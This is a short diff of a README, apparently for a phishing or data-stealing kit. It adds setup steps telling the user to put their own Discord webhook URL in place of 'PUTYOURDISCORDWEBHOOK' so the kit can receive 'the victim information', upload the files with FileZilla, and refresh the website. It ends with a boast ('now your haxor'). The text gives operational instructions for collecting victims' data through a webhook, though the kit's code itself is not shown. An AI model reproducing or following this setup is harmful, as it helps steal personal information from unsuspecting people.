@@ -13,4 +13,14 @@ How to use
 - go to "webhook"
 - Click "New Webhook"
 - Click "Copy Webhook url'
-help : 
+help : https://streamable.com/5emzmc
+
+How to setting to received the victim information
+
+1) Open the 
+2) change the "PUTYOURDISCORDWEBHOOK" to your webhook url
+3) save and put in filezila all file
+4) refresh your website :))
+5) kiss me bcs now your haxor :))
+
+
